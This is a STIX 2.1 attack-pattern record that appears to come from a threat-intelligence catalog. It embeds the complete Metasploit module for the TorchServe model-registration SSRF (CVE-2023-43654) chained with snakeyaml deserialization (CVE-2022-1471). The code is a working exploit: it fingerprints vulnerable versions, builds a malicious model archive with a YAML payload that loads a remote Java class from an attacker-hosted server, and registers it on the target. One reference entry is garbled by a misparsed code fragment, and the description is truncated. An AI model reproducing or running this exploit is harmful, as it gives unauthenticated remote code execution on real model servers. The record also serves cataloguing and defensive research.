{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60d8da11-2bbf-4d39-9b59-f63fed1c9813",
    "created": "2024-08-14T17:10:43.72728Z",
    "modified": "2024-08-14T17:10:43.727284Z",
    "name": "PyTorch Model Server Registration and Deserialization RCE",
    "description": " The PyTorch model server contains multiple vulnerabilities that can be chained together to permit an unauthenticated remote attacker arbitrary Java code execution. The first vulnerability is that the management interface is bound to all IP addresses and not just the loop back interface as the documentation suggests. The",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/torchserver_cve_2023_43654.rb",
            "external_id": "torchserver_cve_2023_43654.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.oligo.security/blog/shelltorch-torchserve-ssrf-vulnerability-cve-2023-43654"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pytorch/serve/security/advisories/GHSA-8fxr-qfr9-p34w"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2"
        },
        {
            "source_name": "reference",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in"
        },
        {
            "source_name": "reference",
            "url": "https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858"
        },
        {
            "source_name": "mri.add_file(config_file",
            "external_id": "%(!!javax.script.ScriptEngineManager!!java.net.URLClassLoader!!java.net.URL\"#{get_uri}/\"))"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Java\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Java::HTTP::ClassLoader\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'PyTorch Model Server Registration and Deserialization RCE',\n      'Description' => %q{\n          The PyTorch model server contains multiple vulnerabilities that can be chained together to permit an\n        unauthenticated remote attacker arbitrary Java code execution. The first vulnerability is that the management\n        interface is bound to all IP addresses and not just the loop back interface as the documentation suggests. The\n        second vulnerability (CVE-2023-43654) allows attackers with access to the management interface to register MAR\n        model files from arbitrary servers. The third vulnerability is that when an MAR file is loaded, it can contain a\n        YAML configuration file that when deserialized by snakeyaml, can lead to loading an arbitrary Java class.\n      },\n      'Author' => [\n        'Idan Levcovich', # vulnerability discovery and research\n        'Guy Kaplan', # vulnerability discovery and research\n        'Gal Elbaz', # vulnerability discovery and research\n        'Swapneil Kumar Dash', # snakeyaml deserialization research\n        'Spencer McIntyre' # metasploit module\n      ],\n      'References' => [\n        [ 'URL', 'https://www.oligo.security/blog/shelltorch-torchserve-ssrf-vulnerability-cve-2023-43654' ],\n        [ 'CVE', '2023-43654' ], # model registration SSRF\n        [ 'URL', 'https://github.com/pytorch/serve/security/advisories/GHSA-8fxr-qfr9-p34w' ],\n        [ 'CVE', '2022-1471' ], # snakeyaml deserialization RCE\n        [ 'URL', 'https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2' ],\n        [ 'URL', 'https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in' ],\n        [ 'URL', 'https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858' ]\n      ],\n      'DisclosureDate' => '2023-10-03',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 8081\n      },\n      'Targets' => [\n        [\n          'Automatic', {\n            'Platform' => 'java',\n            'Arch' => [ARCH_JAVA]\n          }\n        ],\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'Reliability' => [REPEATABLE_SESSION]\n      }\n    )\n  end\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'api-description'))\n    return Exploit::CheckCode::Unknown unless res\n    return Exploit::CheckCode::Safe unless res.code == 200\n    unless res.get_json_document.dig('info', 'title') == 'TorchServe APIs'\n      return Exploit::CheckCode::Safe('The TorchServe API was not detected on the target.')\n    end\n\n    version = res.get_json_document.dig('info', 'version')\n    return Exploit::CheckCode::Detected unless version.present?\n\n    unless Rex::Version.new(version) < Rex::Version.new('8.0.2')\n      return Exploit::CheckCode::Safe(\"Version #{version} is patched.\")\n    end\n\n    Exploit::CheckCode::Appears(\"Version #{version} is vulnerable.\")\n  end\n\n  def class_name\n    'MyScriptEngineFactory'\n  end\n\n  def constructor_class\n    ::File.binread(::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2022-1471', \"#{class_name}.class\"))\n  end\n\n  def on_request_uri(cli, request)\n    if request.relative_resource.end_with?(\"#{@model_name}.mar\")\n      print_good('Sending model archive')\n      send_response(cli, generate_mar, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    if request.relative_resource.end_with?('services/javax.script.ScriptEngineFactory')\n      vprint_good('Sending ScriptEngineFactory class name')\n      send_response(cli, class_name, { 'Content-Type' => 'application/octet-string' })\n      return\n    end\n\n    super(cli, request)\n  end\n\n  def generate_mar\n    config_file = rand_text_alphanumeric(8..15) + '.yml'\n    serialized_file = rand_text_alphanumeric(8..15) + '.pt'\n\n    mri = Rex::Zip::Archive.new\n    mri.add_file(serialized_file, '') # an empty data file is sufficient for exploitation\n    mri.add_file('MAR-INF/MANIFEST.json', JSON.generate({\n      'createdOn' => (Time.now - Random.rand(600..1199)).strftime('%d/%m/%Y %H:%M:%S'), # forge a timestamp of 10-20 minutes ago\n      'runtime' => 'python',\n      'model' => {\n        'modelName' => @model_name,\n        'serializedFile' => serialized_file,\n        'handler' => %w[image_classifier object_detector text_classifier image_segmenter].sample,\n        'modelVersion' => '1.0',\n        'configFile' => config_file\n      },\n      'archiverVersion' => '0.8.2'\n    }))\n    mri.add_file(config_file, %( !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"#{get_uri}/\"]]]] ))\n    mri.pack\n  end\n\n  def exploit\n    start_service\n\n    @model_name = rand_text_alphanumeric(8..15)\n    print_status('Registering the model archive...')\n    # see: https://pytorch.org/serve/management_api.html#register-a-model\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'models'),\n      'vars_get' => { # *must* be vars_get and not vars_post!\n        'url' => \"#{get_uri}#{@model_name}.mar\"\n      }\n    })\n\n    handler\n  end\n\n  def cleanup\n    super\n\n    return unless @model_name\n\n    # see: https://pytorch.org/serve/management_api.html#unregister-a-model\n    send_request_cgi({\n      'method' => 'DELETE',\n      'uri' => normalize_uri(target_uri.path, 'models', @model_name, '1.0')\n    })\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-10-03",
    "x_mitre_platforms": [
        "java'"
    ]
}